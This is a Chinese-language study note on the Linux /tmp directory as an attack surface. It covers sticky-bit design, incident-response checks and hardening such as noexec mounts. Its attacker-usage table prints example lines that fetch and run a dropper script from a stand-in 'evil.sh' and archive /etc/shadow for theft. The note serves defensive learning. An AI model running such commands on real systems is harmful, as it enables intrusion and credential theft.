---
name: /tmp 攻擊面
aliases: [tmp attack surface, /tmp 風險, tmp directory abuse]
category: 資安
status: active
confidence: verified
last-queried: ""
query-count: 0
---

# 定義

Linux 的 `/tmp` 目錄因設計上開放給所有 user 寫入（world-writable + sticky bit）、是攻擊者進系統後常用的暫存空間——存放 dropper / 提權 payload / 暫存被竊資料。IR 接手 server 第一招就是 `ls -la /tmp` 看異常檔。

# 為什麼 `/tmp` 設計成 world-writable

- **正當用途**：所有 user 都需要暫存空間（編輯器 swap / 程式 IPC / lock file）
- **sticky bit `t`**：避免 user A 刪 user B 的檔（雖然 world-writable、但只有檔主能刪）
- **權限通常是 1777**：rwx + sticky for u/g/o

# 攻擊者愛用方式

| 用法 | 例子 |
|---|---|
| **dropper 落地點** | `wget evil.sh -O /tmp/.X11lock && bash /tmp/.X11lock` |
| **提權 payload 暫存** | `cp exploit /tmp/.cache && chmod +x /tmp/.cache` |
| **被竊資料暫存** | `tar czf /tmp/.session_data.tar /etc/shadow ...` |
| **hidden 檔藏匿** | `.X11lock` / `.cache` / `.ICE-unix` 等看似系統檔的名字 |

# IR 必查指令

```bash
# 看所有 /tmp 內容（含 hidden）
ls -la /tmp

# 找最近 24h 在 /tmp 變動的檔
find /tmp -mtime -1

# 找 /tmp 內可執行檔
find /tmp -type f -perm -u+x

# 看誰擁有 /tmp 內檔
ls -la /tmp | awk '{print $3, $9}'
```

# 防禦建議

- **mount /tmp 為 noexec**：`/etc/fstab` 加 `noexec` flag、阻止 /tmp 內檔執行
- **systemd-tmpfiles 自動清理**：定期清過期暫存
- **HIDS 監控**：Tripwire / AIDE / OSSEC 監控 `/tmp` 異常檔
- **logging**：audit log 記錄 /tmp 寫入

# 應用場景

- **Simon 工作場景**：公司 ISO 27001 A.12.6.1（漏洞管理）+ A.16.1.5（IR）對應 /tmp 監控；Linux server hardening checklist 必含 `/tmp noexec`
- **CC / SSCP 考點**：常考 /tmp 為何 world-writable + sticky bit 的設計理由

# 相關概念

- [[file-permissions]]：sticky bit 是 permission 機制延伸
- [[world-writable-file]]：/tmp 是 world-writable 的合法案例
- [[linux-filesystem-hierarchy]]：/tmp 是 FHS 標準目錄
- [[ioc-search]]：/tmp 是 IOC search 必查目錄

# 來源

- Course 4 Module 3 Section 1 Leaf 4 Navigate Linux and read file content
